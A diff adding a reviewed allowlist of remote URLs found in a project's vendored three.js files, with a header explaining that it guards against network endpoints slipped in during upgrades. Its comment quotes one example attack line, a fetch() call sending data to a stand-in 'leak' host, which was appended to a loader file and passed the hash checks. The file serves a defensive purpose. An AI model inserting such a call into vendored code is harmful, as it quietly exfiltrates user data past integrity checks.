@@ -1,0 +1,75 @@
+# vendor/URLS -- every remote URL in vendor/*.js, each one reviewed.
+#
+# Why this exists: vendor/SHA256SUMS pins vendor/ against *accidental* edits,
+# but a deliberate upgrade refreshes it by design -- so on exactly the commit
+# that brings in new third-party code, the hash check stops protecting anything.
+# Codex review round 6 on PR #1 showed it: fetch("https://example.com/leak")
+# appended to STLLoader.js, with SHA256SUMS refreshed, passed all 15 checks.
+#
+# A hash diff is opaque; this list is not. tests/check_invariants.py fails on any
+# remote URL in vendor/ that is not listed here, naming it. So an upgrade that
+# adds a network endpoint cannot land quietly: someone has to add that URL below,
+# in a diff a reviewer can read, and decide what it is.
+#
+# DO NOT regenerate this file wholesale on an upgrade. Add only the new URLs the
+# check names, after reading the code around each one. A URL that is a
+# documentation link or an XML namespace is inert; one that code can pass to a
+# fetch, XMLHttpRequest, Image, script or stylesheet is a network dependency and
+# breaks the air-gap README promises.
+#
+# Format: one URL per line, exactly as the check extracts it (a trailing "." or a
+# missing ")" is the extractor's, kept so the match is exact). Lines starting
+# with "#" are comments. Reviewed 2026-09-23 against three.js r13x as vendored.
+
+
+# GLTFLoader.js: glTF spec and three.js issue links, all inside comments -- inert
+https://github.com/KhronosGroup/glTF/blob/5768b3ce0ef32bc39cdf1bef10b948586635ead3/extensions/2.0/Khronos/KHR_materials_emissive_strength/README.md
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#accessors
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#appendix-c-spline-interpolation
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#buffers-and-buffer-views
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#default-material
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#geometry
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#materials
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#meshes
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#morph-targets
+https://github.com/KhronosGroup/glTF/blob/master/specification/2.0/README.md#sparse-accessors
+https://github.com/KhronosGroup/glTF/pull/1698
+https://github.com/KhronosGroup/glTF/tree/main/extensions/2.0/Khronos/KHR_materials_sheen
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_draco_mesh_compression
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_lights_punctual
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_materials_clearcoat
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_materials_ior
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_materials_iridescence
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_materials_specular
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_materials_transmission
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_materials_unlit
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_materials_volume
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_mesh_quantization
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_mesh_quantization#encoding-quantized-data
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_texture_basisu
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Khronos/KHR_texture_transform
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Vendor/EXT_mesh_gpu_instancing
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Vendor/EXT_meshopt_compression
+https://github.com/KhronosGroup/glTF/tree/master/extensions/2.0/Vendor/EXT_texture_webp
+https://github.com/KhronosGroup/glTF/tree/master/specification/2.0#animations
+https://github.com/KhronosGroup/glTF/tree/master/specification/2.0#cameras
+https://github.com/KhronosGroup/glTF/tree/master/specification/2.0#metallic-roughness-material
+https://github.com/KhronosGroup/glTF/tree/master/specification/2.0#nodes-and-hierarchy
+https://github.com/KhronosGroup/glTF/tree/master/specification/2.0#scenes
+https://github.com/KhronosGroup/glTF/tree/master/specification/2.0#skins
+https://github.com/KhronosGroup/glTF/tree/master/specification/2.0#textures
+https://github.com/mrdoob/three.js/issues/11438#issuecomment-507003995
+https://github.com/mrdoob/three.js/issues/17706
+https://github.com/mrdoob/three.js/issues/18334
+https://github.com/mrdoob/three.js/issues/18342#issuecomment-578981172
+https://github.com/mrdoob/three.js/issues/21559.
+https://github.com/mrdoob/three.js/issues/21819.
+
+# STLLoader.js: Wikipedia links in the file's header comment -- inert
+http://en.wikipedia.org/wiki/STL_(file_format
+https://en.wikipedia.org/wiki/Byte_order_mark#Byte_order_marks_by_encoding
+
+# three.min.js: xhtml is an XML namespace passed to createElementNS, never fetched;
+# the pull-request link is a source reference -- both inert
+http://www.w3.org/1999/xhtml
+https://github.com/mrdoob/three.js/pull/23228
